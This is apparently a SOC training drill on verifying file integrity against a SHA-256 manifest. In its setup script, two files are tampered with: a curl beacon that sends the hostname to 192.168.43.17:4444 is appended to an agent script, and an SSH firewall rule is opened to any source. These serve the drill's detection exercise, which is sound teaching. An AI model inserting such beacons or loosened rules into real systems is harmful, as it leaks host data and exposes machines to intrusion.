# Drill 02 (Basic): Hash File Verification Challenge

> **Level:** Basic
> **Time:** 25–35 minutes
> **Tools:** Docker, sha256sum, md5sum, openssl
> **Objective:** Identify tampered files and validate software integrity

---

## Scenario

You work in a SOC.
Your organization uses a shared internal file server where security tools and configuration files are distributed.
A threat intelligence report just came in: a supply chain attack may have compromised software packages on internal file servers.

Your task is to verify the integrity of 5 files by comparing them against a published SHA-256 manifest.
Find which (if any) files have been tampered with.

---

## Setup

```console
docker run --rm -it ubuntu:22.04 bash
apt-get update -q && apt-get install -y openssl python3 2>/dev/null | tail -3
mkdir -p /drill02 && cd /drill02
```

Run the following to generate the challenge environment:

```bash
python3 << 'SETUP_EOF'
import hashlib, os, random

# Create 5 "software files"
files = {
    "soc_agent_v2.3.sh": b"""#!/bin/bash
# SOC Monitoring Agent v2.3
# Build: 20240115-a7f3c1
echo "Starting SOC agent..."
systemctl start soc-monitor
echo "SOC agent running on port 9090"
""",
    "threat_intel_updater.py": b"""#!/usr/bin/env python3
# Threat Intelligence Updater v1.2
# Hash: checksum verified
import requests, json, logging
logging.basicConfig(level=logging.INFO)

def update_iocs():
    url = 'https://ioc-feed.internal.corp/latest'
    response = requests.get(url, timeout=10)
    iocs = response.json()
    logging.info(f"Updated {len(iocs)} IOCs")
    return iocs

if __name__ == '__main__':
    update_iocs()
""",
    "firewall_rules.conf": b"""# Firewall Rules v4.1 - DO NOT MODIFY WITHOUT CHANGE TICKET
# Last reviewed: 2024-01-10

-A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
-A INPUT -p tcp --dport 443 -j ACCEPT
-A INPUT -p tcp --dport 80 -j REDIRECT --to-port 443
-A INPUT -j DROP
""",
    "ids_config.yaml": b"""# IDS Configuration v2.0
version: "2.0"
rules_path: /etc/ids/rules/
log_path: /var/log/ids/
alert_threshold: HIGH
notify_email: soc@corp.local
tuning:
  suppress_noise: true
  max_packet_size: 65535
""",
    "certificate_bundle.pem": b"""-----BEGIN CERTIFICATE-----
MIICpDCCAYwCCQDU+pQ4pHgSpDANBgkqhkiG9w0BAQsFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjQwMTAxMDAwMDAwWhcNMjUwMTAxMDAwMDAwWjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7
-----END CERTIFICATE-----
""",
}

# Write original files
for filename, content in files.items():
    with open(filename, 'wb') as f:
        f.write(content)

# Generate SHA256SUMS manifest (with ONE pre-computed tampered hash — realistic)
print("=== VENDOR-PUBLISHED SHA256SUMS ===")
print("# Downloaded from: https://internal.corp/releases/v2.3/SHA256SUMS")
print("# GPG-verified: OK")
print()

sums = {}
for filename, content in files.items():
    h = hashlib.sha256(content).hexdigest()
    sums[filename] = h
    print(f"{h}  {filename}")

# Save the manifest
with open('SHA256SUMS.published', 'w') as f:
    for filename, h in sums.items():
        f.write(f"{h}  {filename}\n")

# Now TAMPER with some files (unknown to analyst)
tampered = []

# Tamper 1: Add malicious code to the agent
with open('soc_agent_v2.3.sh', 'ab') as f:
    f.write(b"\n# Telemetry\ncurl -s http://192.168.43.17:4444/beacon?host=$(hostname) &\n")
tampered.append('soc_agent_v2.3.sh')

# Tamper 2: Change firewall rules (allow SSH from anywhere)
content = open('firewall_rules.conf', 'r').read()
content = content.replace('-s 10.0.0.0/8 ', '')
open('firewall_rules.conf', 'w').write(content)
tampered.append('firewall_rules.conf')

print()
print("=== YOUR TASK ===")
print("The files above are the CURRENT state on the file server.")
print("The SHA256SUMS.published file contains vendor-published hashes.")
print()
print("1. Verify all files against the published checksums")
print("2. Identify which files have been tampered with")
print("3. Determine what was changed and why it matters")
print()
print("HINT: Use: sha256sum --check SHA256SUMS.published")
SETUP_EOF
```

---

## Task 1: Verify File Integrity

Use the SHA-256 checksum file to verify all files:

```console
# Run the verification
sha256sum --check SHA256SUMS.published
```

Record your findings:

* Which files PASSED verification?
* Which files FAILED verification?

---

## Task 2: Identify What Changed

For each tampered file, determine what was changed:

```bash
# For each failing file, investigate the difference
# Method: hash the file, compare manually, then examine its contents

# Example approach:
sha256sum soc_agent_v2.3.sh
# Compare with the expected hash in SHA256SUMS.published

# Examine file contents for suspicious changes:
cat soc_agent_v2.3.sh
cat firewall_rules.conf
```

---

## Task 3: Risk Assessment

For each tampered file, answer:

1. **What was modified?** (describe the change)
1. **What is the security impact?** (what could an attacker achieve?)
1. **What action should the SOC take?** (immediate response)

---

## Task 4: Hardening — How to Prevent This

Answer these questions:

1. The SHA256SUMS file was also on the same server as the software. What is the problem with this and how should it be fixed?
1. What is the purpose of GPG-signing the checksum file (shown in the header)?
1. How would code signing (like Authenticode on Windows) have prevented this attack?
1. What additional monitoring controls could detect this type of supply chain compromise?

---

## Bonus: Re-create Verified Checksums

```console
# After an incident, security team wants to re-baseline known-good hashes
# Generate fresh checksums of all files
sha256sum *.sh *.py *.conf *.yaml *.pem > SHA256SUMS.new
echo "New checksums created:"
cat SHA256SUMS.new
```

**Time limit:** 35 minutes

**Pass criteria:** Identify both tampered files and provide correct risk assessment
